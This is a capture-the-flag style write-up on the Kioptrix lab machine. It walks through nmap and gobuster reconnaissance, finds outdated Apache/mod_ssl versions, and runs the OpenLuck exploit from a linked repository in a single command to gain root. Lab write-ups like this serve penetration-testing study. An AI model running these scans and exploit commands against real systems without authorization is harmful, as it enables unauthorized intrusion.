# NMAP Scan

<li>
  Always starting box challenges with nmap port scan to identify potential attack surface, where we can break into and in the end
  land with root/administrator access of the box.
</li>
</br>

```js
# Nmap 7.92 scan initiated Sat Jun  4 16:35:24 2022 as: nmap -sT --min-rate 10000 -oA nmap-alltcp 192.168.14.131
Nmap scan report for kioptrix.vuln (192.168.14.131)
Host is up (0.0061s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 00:0C:29:4B:15:28 (VMware)
```


<li>
  <p>Box is running 6 open ports and we also got information of possible services running, but that don't help us much.
  We need to perform one another scan were we will identify service, version and possible OS information of the box</p>
</li>



```js
nmap -A -p- 192.168.14.131 | tee aggresive-scan.txt                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 16:46 EDT
Nmap scan report for kioptrix.vuln (192.168.14.131)
Host is up (0.00062s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2022-06-05T03:52:50+00:00; +7h05m49s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:4B:15:28 (VMware)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 7h05m48s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
```

<li>
  <p>Okey now we got something to work with, we have identified following places to look more into:</p>
</li>
 <ol>
  <li>Port 80 - HTTP - Apache httpd 1.3.20 ((Unix) - Possible OS (Red Hat Linux) </li>
  <li>Port 139 - SMB(Samba) - Need to find out what version running </li>
  <li>Port 443 - HTTP - Apache/1.3.20 + mod_ssl/2.8.4 OpenSSL/0.9.6b </li>
</ol> 
  
# Enumeration of HTTP and HTTPs
<li>
<p> Very first thing we can do is browse the site and see if there is anything that sticks out.
  When browsing both HTTP and HTTPs we land on the default "Test page" and the only thing that so far sticks out is already
  information that we found about version of Apache/1.3.20, this counts as Information disclosure which should not be visable to us.</p>
</li>  
  
  ![image](https://user-images.githubusercontent.com/85706972/172025520-38795b72-6be8-4154-b0b6-dae822f2a62f.png)

<li>
  <p>Also we can check source-code of the test page, sometimes there is hidden hints, but well there was nothing
  so I tried to check following files, but they don't exist. </p>
</li>

  ```txt
  robots.txt
  sitemap.txt
  ```
 
 <li>
  <p>Now let's start the Directory Brute Force with FFUF/gobuster, this will help us find possible hiddent directores</p>
  </li>
  
 ```js
 gobuster dir -u 192.168.14.131 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt | tee directory_search_scan_ext.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.14.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/06/04 17:30:28 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2890]
/test.php             (Status: 200) [Size: 27]  
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/] 
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
 ```
 <li>
  <p>We got some directories to explore, but for some reason they tried to redirect me to localhost address and it ofcourse does not work.
  From here we have not found anything usefull, but remember that "Apache 1.3.20" and "mod_ssl/2.8.4" we found on NMAP scan, this actually reveals some vulnerability if we search it up with searchsploit </p>
 </li>

![image](https://user-images.githubusercontent.com/85706972/172026370-cbdf67ff-dadc-4f89-a456-00f9edd318ae.png)


# Exploit

<li>
  <p>It appears that for Apache 1.3.20 and mod_ssl/2.8.4 is vulnerability called OpenLuck/OpenFuck. Well the name is very interesting
  but let's clone the exploit from github and use the syntax to try to exploit it and gain the access on the machine.</p>
</li>

<a href="https://github.com/heltonWernik/OpenLuck">OpenLuck Exploit</a>

<li>
  <p>Following the instruction given from Github we are ready to lunch the exploit, don't forget to check the syntax and parameters that are possible to use in our case we need to use 0x6b and we are going to be running it against port 80, due to SSL issues</p>
</li>

```txt
./OpenFuck 0x6b 192.168.14.131 -c 40
```
 
![image](https://user-images.githubusercontent.com/85706972/172026673-9969e806-7f3e-4341-a730-50e23950fde2.png)

<li>
  <p>It worked perfect and congrats box is pwned as we have gained root access on the box</p>
</li>
